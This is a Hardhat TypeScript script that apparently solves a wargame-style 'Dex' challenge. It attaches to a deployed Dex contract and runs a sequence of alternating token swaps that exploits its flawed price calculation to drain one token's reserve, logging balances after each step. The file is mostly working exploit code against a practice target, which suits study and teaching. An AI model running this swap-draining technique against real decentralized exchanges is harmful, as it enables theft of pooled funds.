import { HardhatRuntimeEnvironment } from 'hardhat/types';
import { DeployFunction } from 'hardhat-deploy/types';
import { ethers } from 'hardhat';
import { Dex__factory, ERC20__factory } from '../../typechain-types';

const func:DeployFunction = async function (hre: HardhatRuntimeEnvironment){
    const dexAddress = "0x256F4e86cfef5cd317C32dC6845d72C2A44D453E"
    const userAddress = await (await ethers.getSigners())[0].getAddress()

    console.log(">> Attach Dex Contract");
    const Dex = await ethers.getContractFactory("Dex",(await ethers.getSigners())[0])as Dex__factory;
    const dex = Dex.attach(dexAddress)
    
    const token1Address = await dex.token1();
    const token2Address = await dex.token2();

    console.log(">> Attach Token1 Contract");
    const Token = await ethers.getContractFactory("ERC20",(await ethers.getSigners())[0]) as ERC20__factory;
    const token1 = Token.attach(token1Address);

    console.log(">> Attach Token2 Contract");
    const token2 = Token.attach(token2Address);

    console.log(">>>> 0 dex token1 balanceOf:%s",await token1.balanceOf(dexAddress));
    console.log(">>>> 0 dex token2 balanceOf:%s",await token2.balanceOf(dexAddress));
    
    console.log(">>>> 0 user token1 balanceOf:%s",await token1.balanceOf(userAddress));
    console.log(">>>> 0 user token2 balanceOf:%s",await token2.balanceOf(userAddress));

    console.log(">>> Attack --->");
    console.log("Approve");
    const approveResult = await dex.approve(dexAddress,10000)
    await approveResult.wait()
    


    const swap1Result = await dex.swap(token1Address,token2Address,10);
    await swap1Result.wait()
    // token1 = 0 ; tonke2 = 20

    console.log(">>>> 1 dex token1 balanceOf:%s",await token1.balanceOf(dexAddress));
    console.log(">>>> 1 dex token2 balanceOf:%s",await token2.balanceOf(dexAddress));
    
    console.log(">>>> 1 user token1 balanceOf:%s",await token1.balanceOf(userAddress));
    console.log(">>>> 1 user token2 balanceOf:%s",await token2.balanceOf(userAddress));

    const swap2Result = await dex.swap(token2Address,token1Address,20)
    await swap2Result.wait()
    // token1 = 24 ; tonke2 = 0

    console.log(">>>> 2 dex token1 balanceOf:%s",await token1.balanceOf(dexAddress));
    console.log(">>>> 2 dex token2 balanceOf:%s",await token2.balanceOf(dexAddress));
    
    console.log(">>>> 2 user token1 balanceOf:%s",await token1.balanceOf(userAddress));
    console.log(">>>> 2 user token2 balanceOf:%s",await token2.balanceOf(userAddress));

    const swap3Result = await dex.swap(token1Address,token2Address,24)
    await swap3Result.wait()
    // token1 = 0 ; token2 = 30

    console.log(">>>> 3 dex token1 balanceOf:%s",await token1.balanceOf(dexAddress));
    console.log(">>>> 3 dex token2 balanceOf:%s",await token2.balanceOf(dexAddress));
    
    console.log(">>>> 3 user token1 balanceOf:%s",await token1.balanceOf(userAddress));
    console.log(">>>> 3 user token2 balanceOf:%s",await token2.balanceOf(userAddress));

    const swap4Result = await dex.swap(token2Address,token1Address,30)
    await swap4Result.wait()
    // token1 = 41 ; tonke2 = 0

    console.log(">>>> 4 dex token1 balanceOf:%s",await token1.balanceOf(dexAddress));
    console.log(">>>> 4 dex token2 balanceOf:%s",await token2.balanceOf(dexAddress));
    
    console.log(">>>> 4 user token1 balanceOf:%s",await token1.balanceOf(userAddress));
    console.log(">>>> 4 user token2 balanceOf:%s",await token2.balanceOf(userAddress));

    const swap5Result = await dex.swap(token1Address,token2Address,41)
    await swap5Result.wait()
    // token1 = 0 ; token2 = 65

    console.log(">>>> 5 dex token1 balanceOf:%s",await token1.balanceOf(dexAddress));
    console.log(">>>> 5 dex token2 balanceOf:%s",await token2.balanceOf(dexAddress));
    
    console.log(">>>> 5 user token1 balanceOf:%s",await token1.balanceOf(userAddress));
    console.log(">>>> 5 user token2 balanceOf:%s",await token2.balanceOf(userAddress));


    const swapLastResult = await dex.swap(token2Address,token1Address,45)
    await swapLastResult.wait()
    // token1 = 110 ; token2 = 20

    console.log(">>>> Last dex token1 balanceOf:%s",await token1.balanceOf(dexAddress));
    console.log(">>>> Last dex token2 balanceOf:%s",await token2.balanceOf(dexAddress));
    
    console.log(">>>> Last user token1 balanceOf:%s",await token1.balanceOf(userAddress));
    console.log(">>>> Last user token2 balanceOf:%s",await token2.balanceOf(userAddress));
}

export default func;
func.tags = ['Dex'];

